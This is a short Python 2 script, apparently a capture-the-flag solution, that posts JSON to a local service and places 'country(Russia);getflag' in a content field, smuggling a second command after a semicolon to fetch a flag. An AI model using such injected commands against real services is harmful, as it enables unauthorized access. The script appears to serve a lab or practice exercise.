import json, requests

url = "http://localhost:8888"
data = {'address': 'localhost', 'port': '9999', 'type': 'text', 'content': 'country(Russia);getflag'}
headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
r = requests.post(url, data=json.dumps(data), headers=headers)
print r.text
